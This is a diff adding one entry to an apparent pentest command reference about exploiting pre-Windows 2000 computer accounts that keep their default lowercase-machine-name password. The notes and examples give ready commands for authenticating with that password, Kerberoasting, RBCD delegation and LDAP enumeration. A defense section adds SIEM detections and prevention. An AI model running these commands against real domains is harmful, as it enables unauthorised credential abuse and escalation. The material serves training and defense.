@@ -1,0 +1,100 @@
+{
+  "id": "ad-pre2k-computers",
+  "name": "Pre-Windows 2000 Computer Accounts - Known Password Exploitation",
+  "command": "Get-ADComputer -Filter {PasswordLastSet -lt (Get-Date).AddYears(-1)} -Properties PasswordLastSet, OperatingSystem | Select Name, PasswordLastSet, OperatingSystem",
+  "description": "Computer accounts created with \"Assign this computer account as a pre-Windows 2000 computer\" have their password set to the lowercase machine name (without the trailing $). These accounts can be used for authentication, Kerberoasting across trusts, and RBCD attacks. Shockingly common in legacy environments.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Active Directory",
+  "subcategory": "Credential Access",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "Trustedsec research; AD legacy exploitation",
+  "tags": [
+    "pre2k",
+    "pre-windows-2000",
+    "computer-account",
+    "known-password",
+    "legacy",
+    "machine-account"
+  ],
+  "mitre": [
+    "T1078.002"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== FIND PRE-2000 ACCOUNTS ===\n  # PowerShell:\n  Get-ADComputer -Filter {PasswordLastSet -lt (Get-Date).AddYears(-5)} -Properties PasswordLastSet | Select Name, PasswordLastSet\n  # Or with userAccountControl flag:\n  Get-ADComputer -Filter {userAccountControl -band 0x20} -Properties userAccountControl\n\n=== DEFAULT PASSWORD ===\n  # Pre-2000 computer accounts use lowercase machine name as password:\n  # Machine: WORKSTATION01$ -> Password: workstation01\n  # Machine: SERVER2$       -> Password: server2\n\n=== AUTHENTICATE ===\n  # From Linux:\n  crackmapexec smb <dc_ip> -u WORKSTATION01$ -p workstation01\n  getTGT.py <domain>/WORKSTATION01$:workstation01\n  # From Windows:\n  runas /netonly /user:<domain>\\WORKSTATION01$ cmd.exe\n  # (enter: workstation01 as password)\n\n=== EXPLOITATION ===\n  # Kerberoast with machine account:\n  GetUserSPNs.py <domain>/WORKSTATION01$:workstation01 -dc-ip <dc_ip>\n  # RBCD if machine has delegation rights:\n  rbcd.py -delegate-to <target>$ -delegate-from WORKSTATION01$ -dc-ip <dc_ip> -action write <domain>/WORKSTATION01$:workstation01\n  # Enum AD:\n  ldapsearch -x -H ldap://<dc_ip> -D \"WORKSTATION01$@<domain>\" -w workstation01 -b \"DC=<domain>,DC=local\"",
+  "examples": [
+    {
+      "label": "Find stale computer accounts",
+      "command": "Get-ADComputer -Filter {PasswordLastSet -lt (Get-Date).AddYears(-1)} -Properties PasswordLastSet | Select Name, PasswordLastSet"
+    },
+    {
+      "label": "Auth with known machine password",
+      "command": "crackmapexec smb 192.168.1.10 -u WORKSTATION01$ -p workstation01"
+    },
+    {
+      "label": "Kerberoast with machine account",
+      "command": "GetUserSPNs.py corp.local/WORKSTATION01$:workstation01 -dc-ip 192.168.1.10"
+    }
+  ],
+  "references": [
+    {
+      "title": "TrustedSec - Pre-2000 Computers",
+      "url": "https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/"
+    },
+    {
+      "title": "MITRE T1078.002",
+      "url": "https://attack.mitre.org/techniques/T1078/002/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-addcomputer",
+      "note": "Machine account creation for RBCD chains; pre-2k accounts provide free machine creds.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-impacket-rbcd",
+      "note": "Use pre-2k machine creds for RBCD delegation attacks.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Pre-Windows 2000 computer accounts are created with a predictable password (lowercase machine name). If the password is never changed after joining the domain, the default credential remains valid.",
+    "prerequisites": "Pre-2000 computer accounts in the domain that never rotated their password.",
+    "impact": "Valid domain computer credentials for enumeration, Kerberoasting, and delegation attacks.",
+    "detection": "[MITRE T1078.002] Authentication from computer accounts with very old password timestamps; unusual logon patterns from machine accounts.",
+    "artifacts": "Event 4624 logon from machine accounts; Kerberos TGT requests from stale computer accounts.",
+    "splunk_spl": "index=windows EventCode=4624 TargetUserName=\"*$\"\n| lookup ad_computers ComputerName as TargetUserName OUTPUT PasswordLastSet\n| where PasswordLastSet < relative_time(now(), \"-365d\")\n| table _time, TargetUserName, IpAddress, PasswordLastSet",
+    "elastic_kql": "event.code:\"4624\" AND user.name:*$",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4624\n| where TargetUserName endswith \"$\"\n| join kind=inner (\n  SecurityEvent | where EventID == 4741 or EventID == 4742\n) on TargetUserName",
+    "sigma_rules": "win_security_pre2k_computer_account_auth",
+    "prevention": "Audit and disable pre-2000 computer accounts; force machine password rotation; remove \"Assign this computer account as a pre-Windows 2000 computer\" from provisioning.",
+    "sources": [
+      "Trustedsec research",
+      "https://attack.mitre.org/techniques/T1078/002/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Pre-2000 computer account authentication",
+        "logic": "SecurityEvent\n| where EventID == 4624\n| where TargetUserName endswith \"$\"\n| where LogonType in (3, 10)\n| summarize LoginCount=count(), DistinctSources=dcount(IpAddress) by TargetUserName, bin(TimeGenerated, 1h)\n| where LoginCount > 5 or DistinctSources > 2",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4624"
+        ],
+        "attack": [
+          "T1078.002"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate machine account authentication; service accounts using computer identities",
+        "tuning": "Cross-reference with AD computer password age; alert on accounts with passwords older than 90 days"
+      }
+    ]
+  }
+}
